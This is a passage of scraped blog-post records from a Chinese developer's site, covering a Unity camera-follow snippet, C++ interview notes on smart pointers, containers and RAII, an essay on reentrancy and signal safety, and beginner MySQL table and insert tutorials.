核心在于_CurrentCameraAngleAroundX和_CurrentCameraAngleAroundY以及Distance，这三个变量共同决定了以玩家Player为原点的极坐标系下摄像机所处的空间位置。\n计算坐标时只需要通过Quaternion.Euler来取得旋转四元数，以玩家为原点衍生一条（0,0,-1）的向量并乘上四元数以旋转至Player指向摄像机的方向，最后乘上Distance，即可得到摄像机相对玩家的偏移。\n1 2 3  _PositionTarget = Player.transform.position + Quaternion.Euler(_CurrentCameraAngleAroundX, _CurrentCameraAngleAroundY, 0) * (-Player.transform.forward * Distance);   最后只要将摄像机放置在那个位置，然后LookAt旋转到z轴正方向指向玩家就完事儿了。\n","date":"2018-11-03T18:20:00+08:00","permalink":"https://nnnewb.github.io/blog/p/unity3d-%E6%91%84%E5%83%8F%E6%9C%BA%E8%B7%9F%E9%9A%8F%E6%97%8B%E8%BD%AC%E7%9A%84%E6%96%B9%E6%A1%88/","title":"Unity3d 摄像机跟随旋转的方案"},{"content":"Intro 面试的职位是 C++后端开发工程师，主要聊的还是 C++。在过程中自我感觉面得还行，至少没上次那么蠢。\n聊的内容主要集中在 STL 和线程安全、资源管理的层面。\n惯例的，填完面试信息表并简历一起上交，然后等面试官来客套完，就开始聊技术了。\n 注意，面试官的提问并非原话，有修饰和脑补。\n 0. 预热：你用哪个版本的 C++？ 客套话什么的就略了。\n 面试官：\u0026hellip;行，那我们就聊聊 C++吧。你常用哪个版本的 C++？\n  我：我比较常用的是 C++11。\n C++版本这个问题面试里应该不多见，不过作为引入的话题还行，标准之神会瞑目的。\n对于C++版本这个词，很大概率上大家说的应该就是 C++标准委员会WG21制定的 C++标准了，最新版本的标准文档是 C++17 定稿N4659，制定中的 C++20 标准文档可以访问WG21/docs/papers/2018查阅。\n需要注意的是，如果答成了我用 VC6之类的骚话，很大概率会留下不好的映像——或者对方也是忠实的 VC6 神教教徒的话，达成共识也说不定。\n闲话少叙。\n1. 起手式：std::shared_ptr  面试官：说说std::shared_ptr是怎么实现的？一般怎么去使用它？\n  答：shared_ptr是通过引用计数实现的，它可以作为容器元素，在程序里传递 blabal\u0026hellip;..而且shared_ptr不是线程安全的，它不能跨线程传递，要额外做一层包装 blabla\u0026hellip;\u0026hellip;\n 正巧最近有想写一篇智能指针相关的博客，面试官的第一问就提到了。\n说到智能指针，就必须提一下 RAII 了。\n1.1 异常安全和 RAII std::shared_ptr和其他智能指针类型都在\u0026lt;memory\u0026gt;头文件里定义，主要的作用是实现自动化的资源管理，基于RAII的理念设计和实现。\nRAII指的是获取资源即初始化，英文全写是Resource Acquisition Is Initialization，属于一种面向对象编程语言中常见的惯用法。\n它的思路是这样子的：初始化即获取资源，离开作用域就自动销毁。\nRAII 解决的问题是，当异常发生时，如何确保资源释放。这是个异常安全的问题。\n常见的非 RAII 风格代码里，如果要确保资源被正确释放，就要用try {} catch() {} finally {}块捕获异常，然后执行资源释放的代码，再将异常重新抛出。\n而 RAII 的理念是，让资源的生命周期和一个栈上的对象严格绑定，确保栈上对象被析构的时候，资源也就被一同释放了。\n在 C++中，有大量的代码都是以 RAII 风格进行设计的，其中智能指针也是。\n1.2 std::shared_ptr的实现 引用计数，大概了解过智能指针的人都能回答得出来。\n虽然说实现方式并没有规定只能是引用计数，但实际上大家都是这么写的，万一哪天有个 GC 实现的std::shared_ptr也别太震惊。\n实现思路也挺简单。\n所有指向同一实例的std::shared_ptr应当持有同一个引用计数，来保持所有std::shared_ptr计数同步，所以它们共同拥有一个计数器指针long *p。\n在复制时，shared_ptr管理的对象指针和引用计数器指针被同时复制，然后引用计数器指针保存的引用计数+1——销毁同理，减少引用，直到删除。\n1.3 std::shared_ptr和CopyAssignable std::shared_ptr满足CopyContructiable、CopyAssignable和LessThanComparable这些标准库的具名要求，因此可以作为 STL 容器的元素。\n 顺便一提 Concept 有很大可能出现在 C++20 标准里。\n 1.4 线程安全性 std::shared_ptr不是线程安全的，不然不满足 C++对Zero Cost Abstraction的要（吹）求（逼）。\n依据官方说法，多线程访问不同的std::shared_ptr实例是没问题的（大多容器也是）；多线程访问同一个std::shared_ptr实例，但是只调用const方法，那么也是没问题的（多线程读）；多线程访问同一个std::shared_ptr实例，调用非const方法，那么会产生数据竞争（多线程读写）。\n如果希望在线程间传递 std::shared_ptr 得靠 STL 提供的原子操作库std::atomic。\nstd::atomic可以快速帮助包装一个线程安全的对象或者指针，不过这东西对std::shared_ptr的特化是目前还在制定的C++20标准的一部分，所以能不用则不用，直到标准制定完成稳定，并且各编译器支持完善后再行考虑。\n除此之外，如果确实有这方面的考虑，引入boost是一个不错的选择。\n无论如何，跨线程使用std::shared_ptr我不怎么支持。\n跨线程传递std::shared_ptr本身就是个非常危险的行为。std::shared_ptr作为标准库的一员，背负了 C++的历史包袱，它随时可能被取出裸指针使用，或者意外复制了一次或几次，而这些对线程安全几乎就是意味着作死的行为却没有任何管束。\n1.5 其他智能指针  std::auto_ptr std::weak_ptr std::unique_ptr  其中std::auto_ptr已经被扫进历史的垃圾堆了，作为替代者，std::unique_ptr有更明确的语义和更高的可定制性。\nstd::weak_ptr是对于std::shared_ptr的补充，对于希望使用std::shared_ptr作为使用了指针的数据结构之间的连接方式，又不希望产生循环引用恶劣情况的一个解决方案。弱指针的存在不影响引用计数工作。\n最后是std::unique_ptr，它的语义是明确唯一持有某一资源，依照约定，被std::unique_ptr持有的资源不应该再有第二人持有，std::unique_ptr是唯一访问该资源的入口。\n这些智能指针都有一个共同点：为了兼容 C 代码，所以它们随时可以被取出裸指针而不影响自身的工作，但这种使用方式造成的一切后果自负。\n2. std::vector  面试官：\u0026hellip;知道std::vector吧？讲讲它是怎么实现的。\n  我：vector 保存了一个一定长度的 buffer，当插入时可以避免插入一次就分配一次空间 blabla\u0026hellip;当插入长度超过了 buffer 长度，buffer 会依照内部算法来重新分配一次内存，扩张长度。\n 回答不全对。其实面试官之后又强调了一次，但面试时没有听出来。\n 面试官：那之前分配的 buffer 呢？\n我：之前分配的 buffer 先复制到新的 buffer 里，然后旧 buffer 会被释放。\n 这里对于释放旧 buffer 的说法其实是有问题的，可以具体看看下面。\n2.1 内存布局 std::vector的内存布局是连续的，这一点除了几乎每个人都有所了解之外（\u0026hellip;），标准给出的要求也可以看出点端倪。\n 26.3.11.1 Class template vector overview\nA vector is a sequence container that supports (amortized) constant time insert and erase operations at the end; insert and erase in the middle take linear time. Storage management is handled automatically, though hints can be given to improve eﬃciency.\n 关键点集中在这里：\n \u0026hellip; constant time insert and erase operations at the end;\n 末端插入和删除是常数时间\n \u0026hellip; insert and erase in the middle take linear time.\n 中间插入和删除需要线性时间（就是 O(n)）。\n典型的数组插入和删除的特征，不同的是std::vector可以变长，所以真正插入大量数据的时候会有多次重新分配内存和复制的操作。\n2.2 CopyAssignable的约定 std::vector要求储存的对象满足DefautConstructible、CopyContructiable和CopyAssignable的具名要求，文档参考26.3.11.1第 2 节。\n 26.3.11.1\nA vector satisﬁes all of the requirements of a container and of a reversible container (given in two tables in 26.2), of a sequence container, including most of the optional sequence container requirements (26.2.3), of an allocator-aware container (Table 86), and, for an element type other than bool, of a contiguous container (26.2.1).\n 其中提到的Table 86中列出了DefaultConstructible、CopyAssignable和CopyConstructiable。\n发挥一下脑洞，这些要求完美符合了之前对于重新分配内存的猜测对不对？\n对象要可以被默认构造，因为vector的实现可能是new了一个新的对象数组（更可能是字节数组，到时候再placement new）；对象要可以被复制构造，因为对象可能被从旧数组移动到新数组；对象要可以被复制构造\u0026hellip;..\n当然更可能的原因是vector本身是可复制的，上面的就当我吹逼吧。\n除此之外还有CopyInsertable和MoveInsertable的具名需求，就像其字面意义那样，不多做解释。\n2.3 内存重新分配的方式 对 C 稍有经验的人应该知道 C 语言有一个 API 叫做realloc，它做的事情是这样的：\n 如果可能的话，扩张原先分配的内存的长度。 否则重新分配一块内存，然后把旧的内存复制过去，释放旧内存，返回新指针。 如果找不到足够长度的连续内存，则返回 NULL，不释放旧内存。  C++自然不会少。\n面试时没有想起来，本来认为是一种优化方案，但 STL 本身就算是优化方案了吧（\u0026hellip;）。正确的解答应该是\n 用 realloc 的方式尝试扩展 buffer 长度，如果无法扩展长度，则拷贝旧 buffer 到新 buffer，再释放旧 buffer。\n 还行，失误就是失误，认错复习一遍。\n3. 比较三个容器：vector,map,list  面试官：说说看vector、list、map有什么不同，分别在什么样的上下文环境里去使用它们吧。\n我：vector 可以被随机访问，支持随机访问迭代器，迭代器算法有些不适用在list和map上 blabla\u0026hellip;list通常是链表实现，在插入删除的性能上有优势 blabla\u0026hellip;\u0026hellip;\n 顺便一提还没说到map，面试官就换话题了。\n这一题我大概又没有 get 到面试官的 point，单谈论容器的话可说的东西不少，我觉得面试官可能更想了解下我对这些容器的性能和内存方面的认知，可惜我答的有些太浅白了。\n3.1 迭代器 先从迭代器的角度比较三个容器。\nvector是个典型的随机访问容器，显然支持forward iterator、reversible iterator和random access iterator。典型的实现是dynamic array。\nlist是个线性结构容器，支持forward iterator、reversible iterator。典型的实现是链表。\nmap是个树形容器，支持forward iterator和reversible iterator。典型的实现是红黑树。\n3.2 内存布局和访问效率 讨论常见实现。\nvector是连续分配，访问成本低，插入和删除的成本高，会重分配内存。\nlist是不连续分配，访问成本高，任意位置插入删除成本相对低，插入删除不会导致重新分配整块内存。\nmap是不连续分配，插入删除访问成本不应和线性容器比较，毕竟它是关联容器。插入删除的成本都比较高，因为需要重新平衡树。访问时间在标准中的要求是对数时间复杂度，插入时间懒得继续翻标准文档了。\n3.3 使用上下文 显而易见vector适合高频读，而list适合大量插入删除，map和前面两个迭代器都搭不上调，在需要复杂索引的地方再合适不过了。\n3.4 线程安全性 这些容器都不是线程安全的。\n依照标准，多线程访问不同的容器实例一切都安好，访问同一个实例的const方法也 ok，但是非const方法就会引起数据竞争。\n尤其注意迭代器的选择，这玩意儿有时候不比指针好多少。\n4. 如何管理内存资源  面试官：你在项目里一般是怎么管理内存的呢？\n我：一个是尽可能用智能指针，然后是需要频繁构造对象的场合下可以用 placement new blabla\u0026hellip;\n 内存管理是一个非常广阔的话题，我的回答太过于浅显了。常见的内存管理策略有很多，智能指针只能算是 RAII 这种常见的范式，placement new 算是内存池/对象池的一种写法大概，还有其他很多策略我并不了解也未能涉及。\n4.1 再论 RAII RAII 的范式可以确保异常安全，避免手贱忘记回收内存以及底层设计变更抛出的异常无法处理时导致意外的资源泄露。\n诸如此类等等。\n有一些约定可以关注一下。\n4.1.1 获取资源失败抛异常 首先 RAII 的全写是获取资源即初始化，连资源都没能获取的话，构造理应失败，而不是静默给出一个无效的对象。\n4.1.2 析构绝不抛异常 很好理解，如果析构又抛个异常出来的话，这个对象还析构不析构？父类还析构不析构？\n4.2.3 常见设计 在 STL 里除了智能指针以 RAII 设计以外，还有加锁解锁相关的内容也是：std::lock_guard。\n诸如此类的guard模式也在其他语言中有出现：比如说 C#的using (var file = File.Open(...)) {}。\n4.2 内存池和对象池 内存池和对象池算是常见的设计范式，基本考虑到大量对象的构造删除的情况都会考虑到使用这两个模式，因为真的很好用（\n内存池的模式主要是预先分配内存，然后在这片内存上构造对象，主要的适用场景是大量频繁构造小对象，构造成本低，生命周期短，内存分配成本居高不下的情况。当然，不仅是这里提到的场景，根据具体业务逻辑可能还会有不同的理由去选择内存池模式。\n对象池区别于内存池的地方在于，对象池的对象构造成本要更高，频繁构造和析构是无法接受的，这种时候就需要一个候选备用的对象池，对象池实现需要对象本身允许被复用在不同的地方，一般来说性能会比较好。内存池则没这个顾虑：反正你需要就构造一个呗。\n这两个池都可以用factory模式来提供构造对象的服务，而工厂的消费者不需要了解对象是怎么构造出来的。结合 RAII 的话，内存池、对象池里的对象还可以用一层 RAII 设计的“智能指针”封装，使其完成使命后能自动返还资源，等待下一个工厂访客。\n5. 玩过哪些游戏，对游戏制作流程了解多少？  面试官：喜欢玩游戏吗？都玩过哪些游戏？\n我：我的话\u0026hellip;主要玩的是音游，和贵公司业务可能并没有太多关联。\n面试官：除了音乐游戏，有玩过 RPG、ARPG 类型的游戏吗？\n我：像是辐射啊，老滚啊这些\u0026hellip;开放世界类型的游戏游戏性没那么好，比起来我更喜欢电影式的游戏，比如说最近比较火的《底特律：变人》。\n面试官：\u0026hellip;\u0026hellip;（你丫来捣乱的是吧）\n面试官：说说你对游戏行业的看法吧。\n我：游戏行业前景好啊 blablabla\u0026hellip;娱乐崛起 blabla\u0026hellip;经济增长 blabla\u0026hellip;.\n面试官：\u0026hellip;\u0026hellip;（？？？？）\n面试官：你上一家公司也是制作游戏的吧？就是说，你们游戏制作啊，都有哪方面的人在负责做什么东西，大概是怎么个分工合作的样子。（提醒+强调） 我：哦！哦哦，大概就是一个人负责策划整个游戏的玩法和系统，设计每个细节，然后程序负责去实现，自动测试 blabla\u0026hellip;内部试玩 blabla\u0026hellip;\n 还行，这波操作其实我也是挺佩服自己的。\n5.1 陷阱：玩过哪些游戏 我注意到一件事：在多次面试游戏行业的职位时，都提到这这个问题：\n 你玩过哪些游戏？\n 也许形式上有所区别：\n 你玩过的游戏里，有哪些特别喜欢的？\n 换位思考，如果我是面试官，我为什么要问这个问题？我想知道什么？\n 熟悉游戏吗？\n知道游戏有哪些元素吗？\n能理解（我们招你进来要做的游戏）要你做什么吗？\n 不必太过刻意地表达出对游戏行业的崇拜或者抬高之类的，这一关主要的目的还是引出下文，聊聊对游戏制作流程的理解。如果对面试的公司出的产品有所了解的话可能算是加分项。\n但是，从一个游戏玩家的角度出发，表现出不好的情绪容易留下坏映像——特别是，绝对不要明显地表达出对国产网游、手游、页游的鄙视！！\n从一个玩家的角度出发，我也不喜欢大部分国产的页游手游，但是当着游戏行业公司的面试官的面，表现出我看不起你的态度，知道什么叫作死吗？\n更何况并不是所有国产游戏都是屎，举例来说我现在超喜欢 MUSE DASH 这款国产音游的，手感比兰空 voze、节奏大师之类的好得多，界面也没有像节奏大师那样糊成屎，要不是我的 Unity3D 水平太差我真想给这家 pero pero game 工作室（公司？）投个简历看看。\n除此之外还有就是抱着拯救国产游戏的想法或者态度，又或者劳资教你们什么才是真正的游戏这样的想法或者态度，作死无极限啊。\n比较稳妥的回答方案应该是常见的几个网游，比如说 LOL，DNF，王者荣耀，诸如此类。实际上玩过没玩过\u0026hellip;..咳，不被戳穿就无所谓了。\n5.2 游戏行业 加班是家常便饭，好像所有游戏行业的公司都会这么说。\n大概了解下几个术语，算是加班界的黑话吧。\n一个是 996。什么意思呢？上午 9 点上班，晚上 9 点下班，一周上 6 天，加班费不用考虑了，不存在的，最多给调休。\n再有一个是大小周。一周上 6 天，一周上 5 天，如此循环。同样，大周加班不算加班费，给调休。\n另外就是调休。如果加班一天，将来某天就可以不扣工资休息一天，直白吧。攒下半年的调休然后一口气给自己放 6 个月假这种事情还是做梦比较好，调休基本上就等于无偿加班了，忙起来的时候劝你别休，不然人手就不够了；那闲下来的时候还能让你一周休 6 天？你敢休公司也不敢让你随便休啊，其他员工怎么看。\n发薪日。网上有人总结，发薪日越接近月中的，或者超过月中的，大多都是怕员工流失的公司，而这些公司往往都不是什么好公司。听起来还是挺有道理的（\n当然，最后还是要靠自己的眼睛去确认这一点。\n5.3 游戏的制作流程 之前待得确实是一家小公司，甚至算得上工作室级别的超小初创公司，游戏制作方面的知识储备不算充足，写这篇博客的时候又去补习了一下。\n主要的工种分为策划、美术、程序。\n细分的话，策划可能有数值方面的，世界背景人物背景方面的，对话文本方面的，甚至可能有长篇幅的资料啊故事啊这方面的需求。\n美术有 UI 方面的，人物、场景的原画师，3d 模型制作，动画制作，骨骼制作，特效制作，等等方面的。程序经常需要和美术方面的沟通交流。\n程序的话主要分前后端和测试，再加上运维和 DBA 之类的角色。\n细分的话前端根据开发平台不同也有不同的技术栈，图像特效上可能会有更专业的大牛负责，team leader 带队设计架构，分配工作，诸如此类。后端也一样，根据不同的技术抉择，可能整体的人员配置也有所区别，但大家都是程序嘛。\n测试算是比较独立的，编写测试代码是一件很痛苦的事情（\n所以这份疼痛有专人负责承受了：）\n持续集成啊什么的也被承包了，测试或者运维会去负责的。\nDBA 一般公司也用不到，运维多少会两手 SQL，规模更大的公司可能会设置这个专门职位。\n流程上来说，策划给出游戏方案，美术可能会配合做个初稿效果图之类的（更可能是策划自己做个简单的效果图之类的方便说明），程序疯狂实现（崩溃-爆发-认命 循环），测试则配合给出反馈，让程序的脱发状况持续恶化，最后发布，项目黄了。\n哦不是，我是说项目火了，程序们一跃成为 CTO，迎娶白富美，走上人生巅峰。\n（并没有）\n6. 尾声 其实这次面试的自我感觉还是不错的，没有犯下太蠢的错误，但是可以改进的地方依然很多，语言组织能力需要进一步提高。\n这篇博客的目的是自我反省，但是这次自我反省的效果并不算好，因为面试官的问题基本上都戳在我懂，但又没真正去深入挖掘的领域。日常使用自然没有问题，但理解却谈不上了。\n如果面试官在细节上稍作追究：比如说 placement new 和 user-defined new 之类的话题上深入，异常安全，或者问个 map 用红黑树实现，红黑树什么原理，那么这次我基本又要挂了。\n关于给出的待遇的问题\u0026hellip;\u0026hellip;我其实很好奇\u0026hellip;\u0026hellip;\n因为我真的才工作一年，不懂啊\u0026hellip;\n一年工作年限，C++我也不知道算什么水平，不知道怎么去横向对比，要 8k 是要多了么\u0026hellip;\n初级职位的意思是待遇初级还是能力初级啊\u0026hellip;\n还有主程一般指的是 team leader 对吗，游戏行业程序是不是干到 team leader 就算到头了\u0026hellip;只能转管理岗了\u0026hellip;\n","date":"2018-06-26T17:22:00+08:00","permalink":"https://nnnewb.github.io/blog/p/gamehollywood-%E9%9D%A2%E8%AF%95%E7%AC%94%E8%AE%B0/","title":"GameHollywood 面试笔记"},{"content":"这篇博客主要记录的是关于可重入性的相关定义，以及关于并发安全的思考。\n可重入性 在不同语言中，由于语言标准以及运行期环境规定的不同，可重入性的具体定义可能有所不同。这里聊的是 C++语言中的可重入性。\n所谓可重入性（reetrant），指的是同时具备并发安全和中断安全的特征，这是目前为止我对可重入性的认识，也是这篇博客在写下时给可重入性下的定义。\n这个认知可能并不准确，因为在wiki上的定义是这样的。\n 若一个程序或子程序可以「在任意时刻被中断然后操作系统调度执行另外一段代码，这段代码又调用了该子程序不会出错」，则称其为可重入（reentrant 或 re-entrant）的。即当该子程序正在运行时，执行线程可以再次进入并执行它，仍然获得符合設計時預期的结果。与多线程并发执行的线程安全不同，可重入强调对单个线程执行时重新进入同一个子程序仍然是安全的。\n 但是在很多中文博客里，聊到可重入性的时候往往也会把并发安全混为一谈。实际上来说的话\u0026hellip;\u0026hellip;一个可重入的函数，常常也是并发安全的。\n那么先从并发安全讲起吧。\n并发安全性和可重入性 所谓并发安全已经是老生常谈了。\n以一段非常简单的代码为例，我们打算初始化一个对象，这个对象被两个线程共享。\n1 2 3 4 5  void initialize(Something** someshit) { if(!*someshit) { *someshit = createSomeShit(); } }   显而易见，如果线程在执行到特定环节时发生了切换\n1 2 3 4 5 6 7 8 9 10  void initialize(Something** someshit) { if(!*someshit) { // \u0026lt;-------- 线程切换  // 线程2() {  // initialize(something);  // }  // 线程切换 ---------\u0026gt;  *someshit = createSomeShit(); } }   那么 createSomeShit这段代码就会被执行两次。\n显然这和我们预期的行为不符。\n这里要聊的不是并发，而是\u0026hellip;\u0026hellip;可重入性。所以我们再看看这个函数能否被重入。\n按照 wiki 提供的定义，函数可重入指的是\n 在任意时刻被中断然后操作系统调度执行另外一段代码，这段代码又调用了该子程序不会出错。\n 符合吗？不。为什么？因为同样在那个线程切换的位置上中断，然后再另一段代码里再次执行这个函数，也会触发同样的问题，导致createSomeShit被执行两次。\n1 2 3 4 5 6 7 8 9 10  void initialize(Something** someshit) { if(!*someshit) { // \u0026lt;-------- 被中断  // 中断处理函数() {  // initialize(something);  // }  // 中断结束 --------  *someshit = createSomeShit(); } }   可以看出，那些线程不安全的代码，都是不可重入的。\n那么，线程安全的代码，就一定是可重入的吗？\n中断安全性，或者叫信号安全性 中断这个东西对其他编程语言的用户来说可能会少见一些，在 C/C++语言里，中断并不是什么新鲜话题。\n在 C 标准库中，规定了一系列的信号和信号处理方法。关于信号的定义可以参考这个。\n当进程接收到信号的时候，当前正在执行的代码就会被中断——注意了，这回，锁救不了你。\n在 C/C++中，中断处理是由一个函数进行。在函数里可能会调用到中断时正在执行的函数。那么问题来了——一个线程安全的函数，是中断安全的函数吗？\n1 2 3 4 5 6  void initialize(Something** someshit, std::mutex\u0026amp; realshit) { std::lock_guard\u0026lt;std::mutex\u0026gt;(realshit); if(!*someshit) { *someshit = createSomeShit(); } }   看上去岁月静好~一切线程切换的问题，都被那句std::lock_guard\u0026lt;std::mutex\u0026gt;(realshit)给挡在了墙的另一边。\n但是\u0026hellip;\u0026hellip;\n1 2 3 4 5 6 7 8 9 10 11 12 13  void initialize(Something** someshit, std::mutex\u0026amp; realshit) { std::lock_guard\u0026lt;std::mutex\u0026gt;(realshit); if(!*someshit) { // \u0026lt;----- 调皮的用户按下了 Ctrl-C  // 中断处理函数() {  // initialize(someshit, realshit);  // // inside initialize {  // // std::lock_guard\u0026lt;std::mutex\u0026gt;(realshit); // DEAD LOCK  // // }  // }  *someshit = createSomeShit(); } }   看这里~\n1 2 3  std::lock_guard\u0026lt;std::mutex\u0026gt;(realshit); // 进入信号处理 std::lock_guard\u0026lt;std::mutex\u0026gt;(realshit);   好了，GG。死锁在这个时候发生了。\n经验丰富的大佬可能注意到了，咱还可以用std::recursive_mutex啊！\n这里就要提到一个很遗憾的问题了：C/C++的语言标准给了哪些保证。\nC 对信号处理函数的定义很粗暴，除了abort、_Exit、quick_exit、signal、stdatomic.h的免锁原子函数、atomic_is_lock_free与任何类型的原子参数这些函数以外，任何标准库函数的调用，行为都是未定义的。\nC++对信号处理函数的定义则更加复杂，限制比之 C 更加严格。毕竟标准库要庞大得多\u0026hellip;\u0026hellip;也不是不能理解。\n标准中有个一个地方的描述很微妙：\u0026hellip;\u0026hellip;免锁的。\n换言之，谁又保证了信号处理函数必然和你希望的那个线程是同一个线程呢？\nstd::recursive_mutex的实现依赖于平台提供的系统 API，反正我没有找到语言标准中相关的规定要求信号处理函数必须和main函数在同一个线程，所以我认为这是平台相关的问题：这样的代码是不可移植的。\n按照设计模式原则，我们是面向接口——也就是标准文档编程，而不是面对实现——Visual C++、GCC、MinGW 或者哪个中东土豪在未来某天突发奇想送我一台 MIPS 的超算的话。\n到业务层面的话会更灵活一些——反正我只在某环境下跑，等公司什么时候全面换平台了，咱再能改则改，改不了就跑路。\n递归函数和可重入 递归和重入有一定的相似性，但又有所不同。\n一个递归函数，直觉上来讲，好像应该是可重入的：因为它要调用自己。\n那么\u0026hellip;\u0026hellip;事实上呢？\n写个比较骚的递归删除链表节点的例子。\n1 2 3 4 5 6 7 8 9 10  void removeNode(Node* node, int length) { Node* tmp = node.prev; node.next.prev = tmp; // \u0026lt;------ 出现了！中断兽！  // 不用看了，Node之间的联结已经被破坏了  // 离开了！中断兽！--------\u0026gt;  tmp.next = node.next; freeNode(node); removeNode(tmp.next, length-1); }   轻易地否定了递归函数=可重入函数的直觉想法。\n深究下去，又到了线程安全——然后是死锁——然后提出了std::recursive_mutex或者其他类似的操作——最后走到平台相关的 API 和保证——失去可移植性。\n为什么我一直在提可移植性？\nemmmm，大概是装逼如风，常伴吾身吧。\n标准库好烦人啊 C/C++语言的标准库是出了名的——但不是好的方面，而是他们总在修修补补又一年。\nC 标准库还好说——毕竟语言本身没啥特性，全靠各种平台提供 API 撑着。标准库改来改去也只是割个双眼皮的程度。\nC++要更骚气一些，每隔几年就整个容，简直不给人活路。\n就中断安全来说，虽然不知道内部怎么实现的，但是\u0026hellip;\u0026hellip;printf 这样的函数在信号处理函数里调用的话，也算是未定义行为。\n认输吧，你是斗不过标准的。该依赖平台行为的时候，就去依赖平台行为吧。\n文档引用 懒得找原文，直接看 cppreference 对 signal 的说法就好。有兴趣的话可以找又臭又长的WG14 - N1570 - C11，还有WG21 - N4659 - C++17这两本标准文档。\n尾声 于是这会儿就到了其他各种语言的用户惯例吐槽的时候：\n \u0026hellip;大佬是公司里唯一用 C++写代码的人。他对人说话，总是满口“目标平台”、“标准”、“可移植性”之类的话，叫人半懂不懂的。因为他总是说“C++天下第一！”，别人便从他说的那些半懂不懂的话里，替他取下个绰号，叫 C++大神。\nC++大神一到公司里，程序员们便看着他笑，有的叫道：“C++大神，你的代码又编译出错了！”\n他不回答，对前台说：“倒上特浓的咖啡，今天也要加班到夜里。”便拿出员工卡。程序员们又高声叫嚷道：“你一定又用上新标准了吧？”\nC++大神睁大眼睛说，“你怎么凭空污人清白！”\n“什么清白？我前天亲眼看见你的代码编译报了错，整整十几 MB 的日志！”\nC++大神便涨红了脸，额上的青筋条条绽出，争辩道，“编译器报错怎么能叫错\u0026hellip;\u0026hellip;C++\u0026hellip;\u0026hellip;编译器不支持，那能算错么？”\n接连便是难懂的话，什么“CONCEPT 还不加入标准”、“未定义行为就该是编译错误”、“SFINAE 就是给编译器开洞”、“boost 大法好，天灭 std::experimental”，引得众人都哄笑起来：店内外充满了快活的空气。\n ","date":"2018-06-24T22:48:00+08:00","permalink":"https://nnnewb.github.io/blog/p/%E5%8F%AF%E9%87%8D%E5%85%A5%E5%92%8C%E5%BC%82%E6%AD%A5%E5%AE%89%E5%85%A8/","title":"可重入和异步安全"},{"content":"创建表 CREATE TABLE CREATE TABLE的作用是创建表。不多说，先创建个简单的学生表。\n1 2 3 4 5  CREATETABLEstudents(idint,namechar(16)NOTNULL,primarykey(id));  这里没写 ENGINE=InnoDB，因为这是新 MariaDB 的默认值。\n那么进入正题，CREATE TABLE的语法如下。\n1 2 3 4 5 6  CREATETABLE[表名]([列名][类型][约束和其他属性],[列名][类型][约束和其他属性],....[其他表配置]);  很容易看出，括号里面写的是表的相关配置，包括列定义，主键定义，索引定义等等。\n默认值 在创建表时可以指定默认值，有默认值的列在插入时可以不填。\n语法如下。\n1 2 3  CREATETABLE[表]([列][类型]DEFAULT[值],);  即可为一个列设定默认值。\n非空 非空约束非常常见。比如说，我们要记录学生信息，包括学号、成绩、姓名，那么学生姓名能不能留空呢？显然不行，因为没有姓名的记录让谁看都是一脸懵逼，这破坏了一条记录的完整性。\n创建非空约束的语法如下。\n1 2 3  CREATETABLE[表]([列][类型]NOTNULL,);  这就创建了非空约束。非空约束下，插入数据时不能不填写这个列。\n如果需要要求可空，那么这样做。但一般不用特地写，很多DBMS的列默认创建就是可空的。\n1 2 3  CREATETABLE[表]([列][类型]NULL,);  修改表 ALTER TABLE ALTER TABLE可以修改表定义，添加删除列，修改约束，等等。\n添加列 举例，在一个只有学号和姓名两个列的学生表加入一个新的成绩列，代码如下。\n1 2  ALTERTABLEstudentsADDscoreint;  语法基本是这样。\n1 2  ALTERTABLE[表名]ADD[列名][类型][其他属性和约束];  后面列的定义写法基本和CREATE TABLE时差不多。\n删除列 和添加列差不多，但删除的关键字不是DELETE，而是DROP。\n1 2  ALTERTABLE[表名]DROP[列名];  添加外键约束 外键约束其实保证的是引用完整性，外键约束的列的值必须引用了一个有效的行，或者是NULL。\n举例来说，我们先有两个表。\n学生表\n   id name class     1 student 1 1   2 student 2 2   3 student 3 3    班级表\n   id level     1 Lv5   2 Lv4   3 Lv3    为了让学生表的class关联到班级表的id，我们要这样做。\n1 2 3  ALTERTABLEstudentsADDCONSTRAINTfk_students_classesFOREIGNKEY(class)REFERENCESclasses(id);  语法基本是这样子的\n1 2 3  ALTERTABLE[保存外键的表]ADDCONSTRAINT[外键约束的名字，一般fk开头]FOREIGNKEY([外键名])REFERENCES[引用的表名]([引用的键名])  比较复杂。\n删除表 那么终于到了期待已久的删库跑路阶段。\n删除表的语法非常简单，那么从一开始活到现在的这所学校终于干不下去了，校长决定遣散学生。\n1  DROPTABLEstudents;  人走光了。\n重命名表 校长决定把学校改成夜总会，于是他写道：\n1  RENAMETABLEschoolTOnight_club;  要是换行有这么容易就好了\u0026hellip;\u0026hellip;（你敢说回车看看）\n","date":"2018-06-23T22:34:00+08:00","permalink":"https://nnnewb.github.io/blog/p/mysql-24%E5%B0%8F%E6%97%B6%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-4/","title":"MySQL 24小时入门笔记 - 4"},{"content":"插入 INSERT INSERT用法非常简单。现在我们有表students如下。\n   列名 类型 约束     id int primary key   name char(16) NOT NULL    向里面插入一条学号为1，姓名为学姐的学生，只需要写如下SQL语句。\n1  INSERTINTOstudentsVALUES(1,\u0026#39;学姐\u0026#39;);  语法\n1  INSERTINTO[表]VALUES(列值1,列值2,...);  其中INSERT语句有一个简单的变体，能比较明确地指明将值交付给哪个列。\n1  INSERTINTOstudents(id,name)VALUES(1,\u0026#39;学妹\u0026#39;);  这样写相当于指明了1应该是id，'学妹'应该是name。\n插入多条也很简单，只要在VALUES后面跟更多小括号包围的值集合就行了，记得拿括号分隔，下面给个例子。\n1 2  INSERTINTOstudents(id,name)VALUES(1,\u0026#39;学渣\u0026#39;),(2,\u0026#39;学霸\u0026#39;),(3,\u0026#39;学神\u0026#39;);  INSERT SELECT 这个写法比较有意思，从一个表查询出数据，并插入另一个表。\n举个例子来说，我们有两个班级表，分别叫学渣班和补习班，一旦学渣成绩烂到一定程度，那么我们就要把他分配到补习班里去强制补习。\n怎么做呢？看下面啦。\n1 2 3 4  INSERTINTO补习班(name,score)SELECT学渣班.name,学渣班.scoreFROM学渣班WHERE学渣班.score\u0026lt;10;  值得注意的是，INSERT 填充补习班表时用的并不是你SELECT的列名，而是SELECT后列名的顺序，来对应到要INSERT的表的列上。\n其他的写法和SELECT相同。\n修改 UPDATE UPDATE语句的作用是修改现存行的数据，非常值得注意的是用UPDATE语句时一定要小心写WHERE子句，不然就等着删库跑路吧。\n依然举个实际栗子，学号为10的学生成绩由于作弊而被取消了，我们要更新他的成绩为 0 分，这真是个悲伤的故事:P\n1  